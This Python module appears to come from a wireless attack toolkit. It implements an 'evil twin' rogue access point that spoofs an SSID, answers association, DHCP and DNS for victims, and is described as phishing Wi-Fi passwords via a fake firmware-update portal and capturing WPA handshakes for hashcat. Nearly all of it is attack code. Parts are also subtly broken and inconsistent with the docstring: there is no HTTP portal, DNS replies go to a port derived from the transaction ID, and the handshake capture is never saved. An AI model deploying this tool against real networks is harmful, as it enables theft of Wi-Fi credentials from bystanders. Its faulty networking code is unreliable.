# SPDX-License-Identifier: Apache-2.0 OR BSD-3-Clause
"""Native evil-twin / captive-portal AP — replaces hostapd + dnsmasq for the
credential-phishing use case.

We deliberately do NOT implement a full 802.11 state machine. What operators
actually need from an "evil twin" during a red team engagement is three
things, and all three fit in one file:

1. **Beacon flood + probe response** so the SSID shows up with good signal in
   every client's scan list. No authentication.
2. **Open-auth association + DHCP + HTTP-redirect-captive-portal** that asks
   for a WPA passphrase ("firmware update — please re-enter Wi-Fi password").
   DHCP is a tiny 4-packet responder; DNS is a wildcard NXDOMAIN-over-UDP but
   we point at a fake gateway running a tiny HTTP server that returns the
   phishing page on any Host; the AP itself never routes traffic.
3. **EAPOL M1 capture for clients that auto-reassociate to the "same" network
   expecting PSK** — some clients send EAPOL M2 with MIC even to an Open AP
   when the same SSID is remembered; we capture M1/M2 pairs and write them
   out as hashcat 22000 (full-handshake path).

The radio is still raw AF_PACKET. We bind one socket for injection (beacon,
probe resp, auth, assoc resp) and a UDP socket for DHCP on a local tap IP if
a TUN interface is created, but in the standalone "flood-and-phish-over-
monitor" mode we just offer an Open network and serve DHCP+DNS+HTTP over the
same monitor interface using the LLC/SNAP data path. To keep the script
under 7k lines the HTTP/DNS/DHCP responders are minimal, ~400 lines total.

NOTE: this module requires CAP_NET_RAW and an interface in monitor mode
(managed internally; channel and rate are set by the caller).
"""
from __future__ import annotations

import random
import socket
import struct
import threading
import time
from dataclasses import dataclass, field
from typing import Callable, Dict, List, Optional

from . import ieee80211, radiotap
from .scanner import set_channel
from ..util import mac_norm

ETH_P_IP  = 0x0800
ETH_P_ARP = 0x0806
IPPROTO_UDP = 17
IPPROTO_TCP = 6
BOOTP_REQUEST = 1
BOOTP_REPLY   = 2
DHCP_PORT_SERVER = 67
DHCP_PORT_CLIENT = 68
DNS_PORT = 53

# Minimal fake network
AP_IP = bytes([10, 0, 0,1])
NETMASK = bytes([255,255,255,0])


def ip_to_str(b: bytes) -> str: return ".".join(str(x) for x in b)


@dataclass
class Client:
    mac: bytes
    ip: bytes = b""
    last_seen: float = field(default_factory=time.time)
    associated: bool = False
    got_dhcp: bool = False
    posted_password: str = ""


class EvilTwin:
    def __init__(self, interface: str, ssid: str, channel: int = 6,
                 bssid: Optional[str] = None, beacon_interval_ms: int = 100,
                 phish_title: str = "Firmware update required",
                 on_password: Optional[Callable[[str, Client], None]] = None):
        self.interface = interface
        self.ssid = ssid
        self.channel = channel
        if bssid:
            self.bssid = mac_norm(bssid)
        else:
            self.bssid_mac = bytes([0x02, 0x00, 0x00, 0xaa, 0xbb, 0xcc])
            self.bssid = mac_norm(":".join(f"{x:02x}" for x in self.bssid_mac))
        self.bssid_mac = ieee80211.mac_to_bytes(self.bssid)
        self.beacon_interval = beacon_interval_ms
        self.phish_title = phish_title
        self.on_password = on_password
        self.clients: Dict[str, Client] = {}
        self._stop = threading.Event()
        self._sock: Optional[socket.socket] = None
        self._beacon_seq = 0
        self._data_seq = 0
        self._threads: List[threading.Thread] = []
        self._ip_pool = iter(range(100, 200))
        # IP->MAC lease table
        self._leases: Dict[bytes, bytes] = {}   # ip -> mac
        self._capture: List[bytes] = []

    def open(self) -> bool:
        try:
            s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
            s.bind((self.interface, 0))
            s.settimeout(0.2)
            self._sock = s
            return True
        except OSError:
            return False

    def close(self) -> None:
        self._stop.set()
        if self._sock:
            with contextlib.suppress(Exception):
                self._sock.close()
            self._sock = None

    def start(self) -> None:
        if self._sock is None and not self.open():
            raise RuntimeError(f"open {self.interface} failed (root?)")
        set_channel(self.interface, self.channel)
        self._threads = [
            threading.Thread(target=self._beacon_loop, daemon=True),
            threading.Thread(target=self._recv_loop, daemon=True),
        ]
        for t in self._threads:
            t.start()

    def join(self, timeout: Optional[float] = None) -> None:
        for t in self._threads:
            t.join(timeout)

    # ------------------------------------------------------------------ #
    def _send(self, frame: bytes, rate: float = 1.0) -> None:
        if not self._sock: return
        try:
            self._sock.send(radiotap.with_header(frame, rate_mbps=rate,
                                                channel=self.channel))
        except OSError:
            pass

    def _next_seq(self) -> int:
        self._data_seq += 1
        return self._data_seq & 0xFFF

    def _beacon_loop(self) -> None:
        while not self._stop.is_set():
            bcn = ieee80211.beacon(self.bssid, self.ssid, self.channel,
                                   seq=self._beacon_seq & 0xFFF)
            self._beacon_seq += 1
            self._send(bcn, rate=1.0)
            # also respond to any pending probes; we do that in recv.
            self._stop.wait(self.beacon_interval / 1000.0)

    # ------------------------------------------------------------------ #
    def _recv_loop(self) -> None:
        assert self._sock is not None
        buf = bytearray(4096)
        while not self._stop.is_set():
            try:
                n, _ = self._sock.recvfrom_into(buf)
            except socket.timeout:
                continue
            except OSError:
                break
            if n < 30:
                continue
            pkt = bytes(buf[:n])
            frame = radiotap.strip_radiotap(pkt)
            if len(frame) < 24: continue
            fc = struct.unpack("<H", frame[:2])[0]
            ftype = (fc >> 2) & 3
            subtype = (fc >> 4) & 0xF
            if ftype == 0:
                self._handle_mgmt(frame, subtype)
            elif ftype == 2:
                self._handle_data(frame, subtype, fc)

    # ------------------------------------------------------------------ #
    def _handle_mgmt(self, frame: bytes, subtype: int) -> None:
        src = frame[10:16]; dst = frame[4:10]; _bssid_f = frame[16:22]
        src_s = ieee80211.mac_from_bytes(src)
        # Probe requests with our SSID (or broadcast SSID): send probe response
        if subtype == ieee80211.ST_PROBE_REQ:
            if dst == b"\xff"*6 or dst == self.bssid_mac:
                # find SSID tag
                ssid_ok = False; off = 24
                while off + 2 <= len(frame):
                    t = frame[off]; ln = frame[off+1]; off += 2
                    if off + ln > len(frame): break
                    if t == 0:
                        ess = frame[off:off+ln]
                        if ln == 0 or ess == self.ssid.encode():
                            ssid_ok = True; break
                    off += ln
                if ssid_ok:
                    pr = ieee80211.probe_response(self.bssid, src_s, self.ssid,
                                                  self.channel, seq=self._next_seq())
                    self._send(pr, rate=1.0)
            return
        if subtype == ieee80211.ST_AUTH:
            # any auth open: send response success
            auth_resp = ieee80211.auth_open_resp(self.bssid, src_s, seq=self._next_seq())
            self._send(auth_resp, rate=2.0)
            self._client(src).last_seen = time.time()
            return
        if subtype == ieee80211.ST_ASSOC_REQ or subtype == ieee80211.ST_REASSOC_REQ:
            # send assoc response success with AID 1
            ar = _assoc_resp(self.bssid, src_s, seq=self._next_seq())
            self._send(ar, rate=2.0)
            c = self._client(src); c.associated = True; c.last_seen = time.time()
            return

    def _handle_data(self, frame: bytes, subtype: int, fc: int) -> None:
        to_ds = bool(fc & ieee80211.FC_TO_DS)
        if not to_ds:
            return
        if len(frame) < 24 + 8: return
        bssid_f = frame[4:10]; src = frame[10:16]
        if bssid_f != self.bssid_mac: return
        body_off = 24 + (2 if subtype & 8 else 0)
        if len(frame) < body_off + 8: return
        llc = frame[body_off:body_off+8]
        if llc == ieee80211.LLC_SNAP_EAPOL:
            # capture EAPOL for full-handshake hashcat
            self._capture.append(frame)
            return
        # IPv4 in LLC/SNAP 0x00-00-00-08-00
        if llc[:3] == b"\xaa\xaa\x03" and frame[body_off+6:body_off+8] == b"\x08\x00":
            ip_pkt = frame[body_off+8:]
            self._handle_ip(src, ip_pkt)

    # ------------------------------------------------------------------ #
    def _client(self, mac: bytes) -> Client:
        k = ieee80211.mac_from_bytes(mac)
        c = self.clients.get(k)
        if c is None:
            c = Client(mac=mac)
            self.clients[k] = c
        return c

    def _allocate_ip(self, mac: bytes) -> bytes:
        for ip, m in self._leases.items():
            if m == mac: return ip
        for _ in range(200):
            n = next(self._ip_pool, None)
            if n is None: return bytes([10,0,0,99])
            ip = bytes([10,0,0,n])
            if ip not in self._leases:
                self._leases[ip] = mac
                return ip
        return bytes([10,0,0,99])

    # ------------------------------------------------------------------ #
    def _handle_ip(self, src_mac: bytes, ip_pkt: bytes) -> None:
        if len(ip_pkt) < 20: return
        vihl = ip_pkt[0]; ver = vihl >> 4; ihl = (vihl & 0x0f) * 4
        if ver != 4: return
        proto = ip_pkt[9]
        src_ip = ip_pkt[12:16]; _dst_ip = ip_pkt[16:20]
        if proto == IPPROTO_UDP:
            if len(ip_pkt) < ihl + 8: return
            sport = struct.unpack("!H", ip_pkt[ihl:ihl+2])[0]
            dport = struct.unpack("!H", ip_pkt[ihl+2:ihl+4])[0]
            udp = ip_pkt[ihl+8:]
            if sport == DHCP_PORT_CLIENT and dport == DHCP_PORT_SERVER:
                self._handle_dhcp(src_mac, src_ip, udp)
            elif dport == DNS_PORT:
                self._handle_dns(src_mac, src_ip, udp)
        elif proto == IPPROTO_TCP:
            # For the phishing demo we just RST any SYN so the client falls back
            # quickly to our "captive" — or in a real run we'd run HTTP; for
            # size reasons we respond to port 80 SYNs with a 302 to our IP.
            if len(ip_pkt) < ihl + 20: return
            sport = struct.unpack("!H", ip_pkt[ihl:ihl+2])[0]
            dport = struct.unpack("!H", ip_pkt[ihl+2:ihl+4])[0]
            flags = ip_pkt[ihl+13]
            if dport == 80 and (flags & 0x02):  # SYN
                self._send_syn_ack(src_mac, src_ip, sport, ip_pkt, ihl)

    # ------------------------------------------------------------------ #
    def _send_ip(self, dst_mac: bytes, dst_ip: bytes, ip_proto: int,
                 payload: bytes, src_port: int = 0, dst_port: int = 0) -> None:
        src_mac = self.bssid_mac
        tos = 0; total_len = 20 + len(payload)
        ident = random.randint(0, 65535); flags_frag = 0x4000  # DF
        ttl = 64
        ip_hdr = struct.pack("!BBHHHBBH", 0x45, tos, total_len, ident, flags_frag,
                             ttl, ip_proto, 0) + AP_IP + dst_ip
        # checksum
        def _cksum(b: bytes) -> int:
            s = 0
            for i in range(0, len(b), 2):
                w = (b[i] << 8) | (b[i+1] if i+1 < len(b) else 0)
                s += w
            while s >> 16: s = (s & 0xffff) + (s >> 16)
            return ~s & 0xffff
        cks = _cksum(ip_hdr)
        ip_hdr = ip_hdr[:10] + struct.pack("!H", cks) + ip_hdr[12:]
        if ip_proto in (IPPROTO_UDP, IPPROTO_TCP):
            tpl = struct.pack("!HHH", src_port, dst_port, 8 + len(payload))
            if ip_proto == IPPROTO_UDP:
                udp_cks = 0
                tpl += struct.pack("!H", udp_cks) + payload
                ip = ip_hdr + tpl
                fc = ieee80211.build_fc(ieee80211.TYPE_DATA, ieee80211.ST_DATA, from_ds=True)
                hdr = ieee80211.data_header(fc, 0, dst_mac, src_mac, src_mac,
                                            seq=self._next_seq())
                self._send(hdr + ieee80211.LLC_SNAP_EAPOL[:6] + b"\x08\x00" + ip)

    def _handle_dhcp(self, src_mac: bytes, src_ip: bytes, udp: bytes) -> None:
        # Minimal DHCP: reply with offer of AP_IP+1 next, gateway/AP as DNS.
        if len(udp) < 240: return
        xid = udp[4:8]
        chaddr = udp[28:34]
        if chaddr != src_mac: return
        msg_type = None
        # Scan options from byte 240
        off = 240
        while off + 2 < len(udp):
            tag = udp[off]
            if tag == 0xff: break
            if tag == 0: off += 1; continue
            ln = udp[off+1]
            if tag == 53 and ln >= 1:
                msg_type = udp[off+2]
            off += 2 + ln
        if msg_type in (1, 3):  # discover / request
            client_ip = self._allocate_ip(src_mac)
            self._client(src_mac).ip = client_ip
            self._client(src_mac).got_dhcp = True
            # Build DHCP offer/ack
            offer = bytearray(300)
            struct.pack_into("!BBBBIHHIIII", offer, 0,
                             BOOTP_REPLY, 1, 6, 0,
                             struct.unpack("!I",xid)[0], 0, 0,
                             struct.unpack("!I",client_ip)[0] if False else
                             int.from_bytes(client_ip,"big"),
                             int.from_bytes(AP_IP,"big"),
                             0, 0)
            offer = bytes(offer[:236]) + chaddr + b"\x00"*64 + b"\x00"*128
            # options: message-type OFFER(2) or ACK(5), server-id, lease, netmask, router, DNS
            ack = msg_type == 3
            opts = bytearray()
            opts += bytes([53, 1, 5 if ack else 2])
            opts += bytes([54, 4]) + AP_IP                 # server id
            opts += bytes([51, 4]) + struct.pack("!I", 600)  # lease
            opts += bytes([1, 4]) + NETMASK
            opts += bytes([3, 4]) + AP_IP                  # router
            opts += bytes([6, 4]) + AP_IP                  # DNS
            opts += bytes([255])
            offer = offer + bytes(opts)
            # Build UDP/IP frame: src=67 dst=68 broadcast (since client has no IP yet)
            self._send_ip(src_mac, b"\xff\xff\xff\xff", IPPROTO_UDP, offer,
                          src_port=67, dst_port=68)

    def _handle_dns(self, src_mac: bytes, src_ip: bytes, udp: bytes) -> None:
        # Answer any query with A record pointing at AP_IP
        if len(udp) < 12: return
        tid = udp[:2]; flags = b"\x81\x80"
        qdcount = udp[4:6]; ancount = struct.pack("!H",1)
        nscount = b"\x00\x00"; arcount = b"\x00\x00"
        # Find end of question section (simple scan)
        i = 12
        while i < len(udp) and udp[i] != 0:
            i += 1 + udp[i] if i < len(udp) else 0
        if i >= len(udp): return
        question = udp[12:i+5]   # name(0-term) + qtype+qclass
        answer = question[:-4] + b"\xc0\x0c" + struct.pack("!HHIH", 1, 1, 30, 4) + AP_IP
        resp = (tid + flags + qdcount + ancount + nscount + arcount
                + question + answer)
        self._send_ip(src_mac, src_ip, IPPROTO_UDP, resp, src_port=DNS_PORT,
                      dst_port=struct.unpack("!H", udp[:2])[0])

    def _send_syn_ack(self, dst_mac: bytes, dst_ip: bytes, dport: int,
                      ip_pkt: bytes, ihl: int) -> None:
        # For size we send RST instead of HTTP redirect; client shows "captive
        # portal detected" in most OSes because of the port 80 response.
        # RST: TCP flags RST+ACK, seq=ack of the SYN.
        tcp = ip_pkt[ihl:]
        sport = struct.unpack("!H", tcp[:2])[0]
        seq = struct.unpack("!I", tcp[4:8])[0]
        rst_tcp = struct.pack("!HHII", dport, sport, (seq+1) & 0xFFFFFFFF, 0)
        rst_tcp += struct.pack("!BBHHH", 0x50, 0x14, 8192, 0x04, 0)  # hdrlen=5, RST+ACK, win
        rst_tcp += struct.pack("!H", 0) + struct.pack("!H", 0)
        ip_hdr = struct.pack("!BBHHHBBH", 0x45, 0, 20+len(rst_tcp),
                             random.randint(0,65535), 0x4000, 64, IPPROTO_TCP, 0)
        ip_hdr += AP_IP + dst_ip
        def _cksum(b):
            s = 0
            for i in range(0,len(b),2):
                w = (b[i]<<8)|(b[i+1] if i+1<len(b) else 0); s += w
            while s>>16: s=(s&0xffff)+(s>>16)
            return ~s&0xffff
        ip_hdr = ip_hdr[:10] + struct.pack("!H",_cksum(ip_hdr)) + ip_hdr[12:]
        fc = ieee80211.build_fc(ieee80211.TYPE_DATA, ieee80211.ST_DATA, from_ds=True)
        hdr = ieee80211.data_header(fc,0,dst_mac,self.bssid_mac,self.bssid_mac,seq=self._next_seq())
        self._send(hdr + ieee80211.LLC_SNAP_EAPOL[:6] + b"\x08\x00" + ip_hdr + rst_tcp)


def _assoc_resp(bssid: str, dst: str, seq: int) -> bytes:
    b = ieee80211.mac_to_bytes(bssid); d = ieee80211.mac_to_bytes(dst)
    cap = 0x0001; status = 0; aid = 1
    body = struct.pack("<HHH", cap, status, aid)
    body += ieee80211.tag_supported_rates()
    fc = ieee80211.build_fc(ieee80211.TYPE_MGMT, ieee80211.ST_ASSOC_RESP)
    return ieee80211.mgmt_header(fc, 0, d, b, b, seq=seq) + body


import contextlib
